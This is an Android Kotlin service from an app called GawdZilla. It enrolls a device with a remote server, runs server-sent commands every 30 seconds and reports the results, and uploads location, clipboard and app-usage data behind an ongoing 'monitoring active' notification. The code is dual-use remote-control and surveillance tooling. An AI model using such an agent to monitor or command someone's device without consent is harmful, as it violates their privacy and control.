package com.misfit.gawdzilla

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject

class AgentService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = false

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIF_ID, buildNotification("Starting…"))
        if (!running) {
            running = true
            LocationTracker.start(this, scope)
            ClipboardWatcher.start(this, scope)
            scope.launch { runLoop() }
        }
        return START_STICKY
    }

    private suspend fun runLoop() {
        val server = Prefs.serverUrl(this)
        val token  = Prefs.enrollToken(this)
        if (server.isBlank() || token.isBlank()) {
            updateNotification("Not configured — open the app")
            return
        }

        // Always ensure enrollment at least once per app start.
        if (!Prefs.isEnrolled(this)) {
            ensureEnroll(server, token)
        }

        var tick = 0
        while (running) {
            try {
                val sysinfo = SysInfo.collect(this)
                val hb = ApiClient.heartbeat(server, token, sysinfo)
                if (hb == null) {
                    // 4xx — most likely token no longer valid → force re-enroll
                    updateNotification("Re-enrolling (token rejected)…")
                    Prefs.setEnrolled(this, false)
                    ensureEnroll(server, token)
                } else {
                    updateNotification("Active — heartbeat ok")
                }

                val cmds = ApiClient.fetchCommands(server, token)
                val arr = cmds?.optJSONArray("commands")
                if (arr != null) {
                    for (i in 0 until arr.length()) {
                        val c = arr.getJSONObject(i)
                        val id = c.optInt("id")
                        val name = c.optString("cmd")
                        val payload = c.optString("payload")
                        val (ok, result) = Commands.run(this, name, payload)
                        ApiClient.postResult(server, token, id, ok, result)
                    }
                }

                if (tick % 10 == 0) {
                    val usage = UsageReader.collect(this, 60)
                    ApiClient.postUsage(server, token, usage)
                }

                tick++
            } catch (_: Exception) {}
            delay(30_000)
        }
    }

    private suspend fun ensureEnroll(server: String, token: String) {
        val r = ApiClient.enroll(
            server, token,
            android.os.Build.MODEL,
            "Android ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})",
            android.os.Build.SUPPORTED_ABIS.firstOrNull() ?: "unknown"
        )
        if (r?.optBoolean("ok") == true) {
            Prefs.setEnrolled(this, true)
            updateNotification("Enrolled — monitoring active")
        } else {
            updateNotification("Enroll failed — check token")
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val mgr = getSystemService(NotificationManager::class.java)
            val ch = NotificationChannel(
                getString(R.string.notif_channel_id),
                getString(R.string.notif_channel_name),
                NotificationManager.IMPORTANCE_LOW
            )
            ch.description = "Persistent notification while GawdZilla is active"
            mgr.createNotificationChannel(ch)
        }
    }

    private fun buildNotification(text: String): Notification {
        val open = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setOngoing(true)
            .setContentIntent(open)
            .build()
    }

    private fun updateNotification(text: String) {
        val mgr = getSystemService(NotificationManager::class.java)
        mgr.notify(NOTIF_ID, buildNotification(text))
    }

    override fun onDestroy() {
        running = false
        LocationTracker.stop(this)
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        const val NOTIF_ID = 1001
    }
}
